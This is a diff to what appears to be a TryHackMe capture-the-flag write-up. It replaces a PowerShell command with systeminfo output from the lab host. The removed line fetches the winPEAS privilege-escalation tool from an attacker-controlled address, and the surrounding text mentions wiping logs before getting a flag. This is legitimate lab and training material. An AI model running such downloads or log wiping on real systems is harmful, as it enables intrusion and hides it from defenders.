@@ -39,6 +39,22 @@ After removing all the logs, I successfully retrieved the first flag:
 
 THM{****************}
 
-Invoke-WebRequest -Uri "http://10.6.9.14:8888/winPEASexe" -OutFile "winPEASexe.exe"
+systeminfo:
+
+System Information Summary:
+Host Name: HOSTEVASION
+OS: Windows Server 2019 Datacenter, Version 10.0.17763 Build 17763
+Install Date: 3/17/2021
+System Uptime: Since 11/30/2023
+Hardware: Xen HVM domU, x64-based PC
+Processor: Intel64 Family 6 Model 63 Stepping 2, ~2400 Mhz
+BIOS Version: Xen 4.11.amazon (Dated 8/24/2006)
+Memory: 4,096 MB total, 2,787 MB available
+Virtual Memory: 4,800 MB max size, 3,401 MB available
+Network Interface: AWS PV Network Device, IP 10.10.34.210
+DHCP Server: 10.10.0.1
+Domain: WORKGROUP
+Hotfixes: Information not available
+Hyper-V: Hypervisor detected
 
 
